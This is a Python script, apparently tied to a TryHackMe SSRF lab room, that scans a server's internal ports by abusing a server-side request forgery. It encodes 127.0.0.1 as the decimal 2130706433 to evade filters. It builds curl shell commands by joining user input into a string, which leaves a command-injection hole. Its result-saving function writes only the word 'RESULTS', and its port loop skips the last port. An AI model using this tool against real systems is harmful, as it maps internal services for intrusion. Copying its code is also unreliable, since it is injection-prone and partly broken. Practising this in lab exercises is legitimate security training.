#!/bin/python3
import sys
import subprocess

#TEST: https://tryhackme.com/room/ssrf

number_of_arguments = len(sys.argv) - 1

def show_help():
	print('\nTemplate: python3 ssrf_port_enum.py <url> [first_port] [last_port] [filename]\n')
	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:"')
	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:" 1 1000')
	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:" 1 1000 results.txt\n')

def save_to_file():
	if number_of_arguments == 4:
		filename = str(sys.argv[4])
	else:
		filename = "ssrf_enum_result.txt"
	
	f = open(filename, "w")
	f.write("RESULTS")
	f.close()
	
	print('Result saved to file: ' + filename)

def enumerate_ports():
	url = str(sys.argv[1])
	print('URL: ' + url + 'PORT')
	
	if number_of_arguments == 2:
		print('Last port number is needed too!')
		show_help()
		exit()
	
	if number_of_arguments > 2:
		range_min = int(sys.argv[2])
		range_max = int(sys.argv[3])
	else:
		range_min = 1
		range_max = 65535
	
	print('Scan port range: ' + str(range_min) + '-' + str(range_max))
	
	for x in range(range_min, range_max):
		cmd = int(subprocess.getoutput("curl -so /dev/null " + url + str(x) + " -w '%{size_download}'"))
		
		if cmd != 1045:
			print("Open port: " + str(x))


if number_of_arguments > 0 and number_of_arguments < 5:
	try:
		enumerate_ports()
		save_to_file()
	except Exception as inst:
	        print('Error: ' + str(inst))
	        print('Script terminated!')
	
else:
	print('Wrong number of arguments!\n')
	show_help()

	
	